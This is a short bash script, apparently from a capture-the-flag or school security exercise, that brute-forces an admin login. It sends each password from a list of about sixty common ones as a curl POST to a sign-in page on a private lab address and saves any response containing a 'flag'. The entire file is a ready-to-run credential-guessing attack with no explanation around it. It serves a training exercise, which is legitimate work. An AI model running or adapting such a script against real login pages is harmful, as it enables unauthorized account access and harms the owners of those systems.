declare -a passwords

passwords=(
000000 1qaz2wsx 1234 12345 111111 121212 123123 123456 
654321 666666 696969 1234567 12345678 123456789 1234567890 
aa123456 abc123 access admin adobe123 ashley azerty bailey 
baseball batman charlie donald dragon flower Football football 
freedom hello hottie iloveyou jesus letmein login loveme master 
michael monkey mustang ninja passw0rd password password1 photoshop 
princess qazwsx qwerty qwerty123 qwertyuiop shadow solo starwars 
sunshine superman trustno1 welcome whatever zaq1zaq1)

#   The following line is here to make a faster test during the correction if anyone wants to :
#   passwords=(password password shadow 123456) 

for pwd in ${passwords[*]}
    do
        curl -X POST "http://10.11.200.239/index.php?page=signin&username=admin&password=${pwd}&Login=Login#" | grep "flag" >> file
    done
if grep -q flag "./file"; then
        cat file
fi
